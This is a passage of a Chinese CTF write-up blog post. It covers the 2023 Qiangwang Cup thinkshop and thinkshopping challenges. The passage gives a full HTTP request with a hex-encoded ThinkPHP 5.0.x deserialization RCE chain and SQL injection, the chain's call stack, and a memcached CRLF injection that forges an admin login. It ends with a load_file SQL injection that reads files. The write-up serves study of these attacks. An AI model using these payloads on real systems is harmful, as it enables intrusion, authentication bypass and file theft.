+<p>所以这里相当于是过滤了O开头的序列化数据 因此我们需要用array套一层</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702962000796-d8a07081-ba60-473a-88de-68622e10e85f.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /public/index.php/index/admin/do_edit.html HTTP/1.1</span><br><span class="line">Host: 8.130.34.53:36000</span><br><span class="line">Content-Length: 3642</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://8.130.34.53:36000</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://8.130.34.53:36000/public/index.php/index/admin/goods_edit/id/1.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: lang=zh-CN; PHPSESSID=bd8qvbnd5o75gf8hee58mjc2dl; security=low; session=s%3AwF7W5kbM_l9kvG45vBvcplohNTrNUGDm.rlq4UgfTZE97SVMLHKBWb1E1FKhkK9XSTVSf4RMR5mU; ajs_anonymous_id=16400539-7c9c-4fb2-a5e1-9e30824abd6f; beegosessionID=669d3f25e6e82d40ee79eef74ed5c359</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">id=1&amp;name=fake_flag&amp;price=100.00&amp;on_sale_time=2023-05-05T02%3A20%3A54&amp;image=https%3A%2F%2Fi.postimg.cc%2FFzvNFBG8%2FR-6-HI3-YKR-UF-JG0-G-N.jpg&amp;data`%3Dunhex(&#x27;59546f784f6e74704f6a4137547a6f794e7a6f6964476870626d746363484a765932567a633178776158426c633178586157356b6233647a496a6f784f6e747a4f6a4d304f69494164476870626d746363484a765932567a633178776158426c633178586157356b6233647a41475a706247567a496a74684f6a453665326b364d4474504f6a45334f694a3061476c75613178746232526c6246785161585a76644349364d7a7037637a6f354f6949414b6742686348426c626d51694f3245364d547037637a6f314f694a715a57787365534937637a6f344f694a6e5a585246636e4a766369493766584d364f446f6941436f415a584a79623349694f3038364d7a4136496e526f61573572584731765a47567358484a6c624746306157397558454a6c624739755a334e55627949364d7a7037637a6f784e546f6941436f41633256735a6c4a6c6247463061573975496a74694f6a4137637a6f344f6949414b6742786457567965534937547a6f784e446f6964476870626d74635a474a635558566c636e6b694f6a453665334d364f446f6941436f416257396b5a5777694f3038364d6a4136496e526f6157357258474e76626e4e76624756635433563063485630496a6f794f6e747a4f6a6b364967417141484e306557786c6379493759546f784f6e74704f6a4137637a6f334f694a6e5a58524264485279496a7439637a6f794f446f694148526f6157357258474e76626e4e7662475663543356306348563041476868626d52735a534937547a6f794f546f6964476870626d74636332567a63326c76626c786b636d6c325a584a63545756745932466a614755694f6a493665334d364d5441364967417141476868626d52735a5849694f3038364d6a6736496e526f6157357258474e685932686c5847527961585a6c636c784e5a57316a59574e6f5a5751694f6a4d3665334d364d5441364967417141476868626d52735a5849694f3038364d544d36496e526f6157357258464a6c6358566c633351694f6a493665334d364e6a6f6941436f415a325630496a74684f6a453665334d364e546f69616d567362486b694f334d364e6a6f695932463049433871496a7439637a6f354f6949414b67426d615778305a5849694f334d364e6a6f6963336c7a64475674496a7439637a6f784d446f6941436f4162334230615739756379493759546f784f6e747a4f6a5936496e42795a575a7065434937637a6f324f694a715a577873655338694f33317a4f6a593649674171414852685a794937596a6f784f33317a4f6a6b364967417141474e76626d5a705a79493759546f794f6e747a4f6a5936496d563463476c795a534937637a6f774f6949694f334d364d544936496e4e6c63334e7062323566626d46745a534937637a6f774f6949694f3331396658317a4f6a45784f6949414b6742696157356b515852306369493759546f784f6e74704f6a4137637a6f774f6949694f333139637a6f324f694a7759584a6c626e51694f3038364d6a4136496e526f6157357258474e76626e4e76624756635433563063485630496a6f794f6e747a4f6a6b364967417141484e306557786c6379493759546f784f6e74704f6a4137637a6f334f694a6e5a58524264485279496a7439637a6f794f446f694148526f6157357258474e76626e4e7662475663543356306348563041476868626d52735a534937547a6f794f546f6964476870626d74636332567a63326c76626c786b636d6c325a584a63545756745932466a614755694f6a493665334d364d5441364967417141476868626d52735a5849694f3038364d6a6736496e526f6157357258474e685932686c5847527961585a6c636c784e5a57316a59574e6f5a5751694f6a4d3665334d364d5441364967417141476868626d52735a5849694f3038364d544d36496e526f6157357258464a6c6358566c633351694f6a493665334d364e6a6f6941436f415a325630496a74684f6a453665334d364e546f69616d567362486b694f334d364e6a6f695932463049433871496a7439637a6f354f6949414b67426d615778305a5849694f334d364e6a6f6963336c7a64475674496a7439637a6f784d446f6941436f4162334230615739756379493759546f784f6e747a4f6a5936496e42795a575a7065434937637a6f324f694a715a577873655338694f33317a4f6a593649674171414852685a794937596a6f784f33317a4f6a6b364967417141474e76626d5a705a79493759546f794f6e747a4f6a5936496d563463476c795a534937637a6f774f6949694f334d364d544936496e4e6c63334e7062323566626d46745a534937637a6f774f6949694f333139665831396658303d&#x27;)/**/where/**/id%3D1/**/or/**/6%3D6#&amp;data=123%0D%0A</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702962450408-5c2cd26c-a85f-4dbd-bce7-939784dd8d56.png" alt="img"></p>
+<p>成功</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702962464453-4874790c-8e3d-4dc4-8569-c1ccbf5a5da9.png" alt="img"></p>
+<h2 id="thinkphp5-0-x-RCE反序列链分析"><a href="#thinkphp5-0-x-RCE反序列链分析" class="headerlink" title="thinkphp5.0.x RCE反序列链分析"></a>thinkphp5.0.x RCE反序列链分析</h2><p>那么我们之前是已经分析过直接写shell文件的链子了 <a href="https://z1d10t.fun/post/60ce7176.html#more">Thinkphp5.0.x~5.2.x版本反序列化链挖掘学习</a></p>
+<p> 在这里的链子是直接RCE的</p>
+<p>整个链子我愿称之为是5.0.xshell链子的前半段+5.1.xRCE链子的后半段融合版本</p>
+<p>前面的链子和5.0.x几乎相同 直到来到Memcached.php write()函数</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702971190280-7ec590ae-3529-42d9-bd4d-99bdf3c54be3.png" alt="img"></p>
+<p>5.0.x中我们是调用了File类中的set方法去写shell</p>
+<p>但是这条链子我们还是继续调用本类中的set方法</p>
+<p>我们跟进一下 这里着重关注has()方法 传入的<code>$name</code>是我们可控的变量和<code>&lt;getAttr&gt;xxx&lt;getAttr&gt;</code>拼接的结果</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702971298577-f25fd92a-db9a-43ad-b262-eb3dce893ef2.png" alt="img"></p>
+<p>继续跟进	接着会调用<code>$this-&gt;handler-&gt;get</code>方法 可以看到此时<code>$this-&gt;handler</code>为Request对象 那么调过5.1.xrce链子的都会很熟悉这个Request类 我们就是利用这个类来RCE</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702971524833-f26caae8-de39-468a-b956-a8ce443ca468.png" alt="img"></p>
+<p>跟进到Request中的get方法 传入input函数的$this-&gt;get就是我们输入的get传参</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702971703269-e39ca43a-d1e9-4584-8bbd-3e5c53d4b6d2.png" alt="img"></p>
+<p>继续跟进到getFilter这里我们的filter还是空值 那么就是由这个函数帮我们赋值的 并且<code>$this-&gt;filter</code>可控</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702972367586-8be3bc25-e176-4464-b9b5-c663b53a5d65.png" alt="img"></p>
+<p>跟进获取到filter 之后会被当作命令执行函数调用</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702972401359-2ac1eb11-c1f4-47c8-85ec-24e0587b4fb5.png" alt="img"></p>
+<p>最后到了filterValue() 老朋友了 里面存在<code>call_user_func()</code>直接进行命令执行 这么这个链子就算是完成了</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702972503070-1c67ca7a-917c-4e46-9a82-709ba0110556.png" alt="img"></p>
+<p>整个调用栈为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Request.php:1094, think\Request-&gt;filterValue()</span><br><span class="line">Request.php:1040, think\Request-&gt;input()</span><br><span class="line">Request.php:706, think\Request-&gt;get()</span><br><span class="line">Memcache.php:66, think\cache\driver\Memcache-&gt;has()</span><br><span class="line">Memcache.php:98, think\cache\driver\Memcache-&gt;set()</span><br><span class="line">Memcached.php:102, think\session\driver\Memcached-&gt;write()</span><br><span class="line">Output.php:154, think\console\Output-&gt;write()</span><br><span class="line">Output.php:143, think\console\Output-&gt;writeln()</span><br><span class="line">Output.php:124, think\console\Output-&gt;block()</span><br><span class="line">Output.php:212, call_user_func_array:&#123;thinkphp/library/think/console/Output.php:212&#125;()</span><br><span class="line">Output.php:212, think\console\Output-&gt;__call()</span><br><span class="line">Model.php:912, think\console\Output-&gt;getAttr()</span><br><span class="line">Model.php:912, think\model\Pivot-&gt;toArray()</span><br><span class="line">Model.php:936, think\model\Pivot-&gt;toJson()</span><br><span class="line">Model.php:2267, think\model\Pivot-&gt;__toString()</span><br><span class="line">Windows.php:163, file_exists()</span><br><span class="line">Windows.php:163, think\process\pipes\Windows-&gt;removeFiles()</span><br><span class="line">Windows.php:59, think\process\pipes\Windows-&gt;__destruct()</span><br></pre></td></tr></table></figure>
+
+<p>参考：<a target="_blank" rel="noopener" href="https://igml.top/2021/09/28/2021-0CTF-FINAL/">2021 0CTF FINAL wp</a></p>
+<h1 id="thinkshopping"><a href="#thinkshopping" class="headerlink" title="thinkshopping"></a>thinkshopping</h1><p>和上一题相同给了附件 先把环境本地搭起来</p>
+<p>这一题和上一题不同的是没有了插入账号密码这条数据了</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702974066962-dff9e6bb-463a-4f0f-95dd-fabfc5e9aa22.png" alt="img"></p>
+<p>并且反序列化入口地址也被删除了</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702974868120-7a71d779-fe2a-428e-9af9-796aa473f4e7.png" alt="img"></p>
+<p>最重要的是mysql的secure_file_priv为空 那么这个值不为空的时候比如被设置为<code>/var/lib/mysql-files/</code></p>
+<p>那么用户只能使用<code> LOAD DATA</code> 和 <code>SELECT ... INTO OUTFILE </code>将文件保存到或者从<code>/var/lib/mysql-files/ </code>目录中</p>
+<p>为空则表示没有限制了</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702974362330-1f194402-43f5-40b4-a5a1-49d8f11268c8.png" alt="img"></p>
+<p>那么我们就可以用sql注入来任意文件读取了</p>
+<p>但关键是我们该如何登录呢</p>
+<p>我们再来看一眼start.sh  可以看到是在11211端口启动了memcached 那么这是什么呢 它是一个内存数据库 </p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702975001753-fb10f6df-577c-4b61-b1e4-7369b1a6154d.png" alt="img"></p>
+<p>并且也配置了cache使用memcached做缓存</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702975747424-2f9e8e08-74a7-44f9-a925-e56bd17954c3.png" alt="img"></p>
+<p>登录的时候 使用了cache获取缓存</p>
+<p>跟进find函数 此处调用了memcache的get指令</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702975946864-223a0edb-5233-425f-b630-f2deed26e9a1.png" alt="img"></p>
+<p>并且根据<code>$key = &#39;think:&#39; . $this-&gt;connection-&gt;getConfig(&#39;database&#39;) . &#39;.&#39; . (is_array($options[&#39;table&#39;]) ? key($options[&#39;table&#39;]) : $options[&#39;table&#39;]) . &#39;|&#39; . $data;</code></p>
+<p>缓存的key格式为<code>think:shop.admin|username</code></p>
+<p>那么怎样控制缓存的值 memcached存在CRLF注入漏洞 参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/328384.html">php-memcached CRLF绕过 - FreeBuf网络安全行业门户</a></p>
+<p>通俗来看就是可以通过set设置任意值 比如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TOKEN%00%0D%0Aset%20snowwolf%200%20500%204%0D%0Awolf</span><br><span class="line">等价于</span><br><span class="line">set snowwolf 0 500 4</span><br><span class="line">wolf</span><br></pre></td></tr></table></figure>
+
+<p>根据大头师傅的方法可以得到memcacged的值的样子[<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/7GY8b9GbR1raU1V5gDTBaQ">CTF复现计划]2023强网杯初赛 thinkshop[ping]</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">telnet 127.0.0.1 11211</span><br><span class="line">get think:shop.admin|admin</span><br><span class="line">a:1:&#123;i:0;a:3:&#123;s:2:&quot;id&quot;;i:1;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:32:&quot;21232f297a57a5a743894a0e4a801fc3&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>除此之外根据大头师傅还有坑点：</p>
+<blockquote>
+<p>这里有个坑点，就是memcached本身是没有数据类型的，只有key-value的概念，存放的都是字符串，但是PHP编程语言给它给予了数据类型的概念（当flags为0为字符串，当flags4为数组等等），我们看一下memcached的set命令格式：</p>
+<p>上图中的红色箭头所指向的4，就是下方的flags位置，也就是说，在PHP中，flags为4的缓存数据，被当做数组使用</p>
+</blockquote>
+<p>所以我们构造CRLF注入命令要把flags设置为4 也就是数组形式</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin%00%0D%0Aset%20think%3Ashop.admin%7Cadmin%204%20500%20101%0D%0Aa%3A3%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22password%22%3Bs%3A32%3A%2221232f297a57a5a743894a0e4a801fc3%22%3B%7D&amp;password=admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702978743938-c087ad37-acc8-44dc-8d8d-4fe6b84a4ab0.png" alt="img"></p>
+<p>然后登录抓包修改payload为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data`%3Dunhex(&#x27;&#x27;)/**/,`name`%3Dload_file(&#x27;/fffflllaaaagggg&#x27;)/**/where/**/id%3D1/**/or/**/1%3D1#=1</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p>学习于各位厉害的师傅 跪拜：</p>
+<p>[<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/7GY8b9GbR1raU1V5gDTBaQ">CTF复现计划]2023强网杯初赛 thinkshop[ping]</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/69/">强网杯 2023 By W&amp;M - W&amp;M Team</a></p>
+<p><a target="_blank" rel="noopener" href="https://igml.top/2021/09/28/2021-0CTF-FINAL/">2021 0CTF FINAL wp</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/post/60ce7176.html" rel="prev" title="Thinkphp5.0.x~5.2.x版本反序列化链挖掘学习">
+                  <i class="fa fa-chevron-left"></i> Thinkphp5.0.x~5.2.x版本反序列化链挖掘学习
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">陇ICP备2023001761号-1 </a>
+  </div>
+
+<div class="copyright">
+  &copy; 2023.2 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z1d10t</span>
+</div>
+
+
+
+    </div>
+  </footer>
+
+  
+
+  <a href="https://github.com/Z1d10t" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"Z1d10t","repo":"Z1d10t.github.io","client_id":"c9dd41fa890386350257","client_secret":"c78f6b60a410862c2dcc596f09db2f0c06f025c6","admin_user":"Z1d10t","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"e3a2224086254304cf001e793bf097ef"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+</body>
+</html>
+
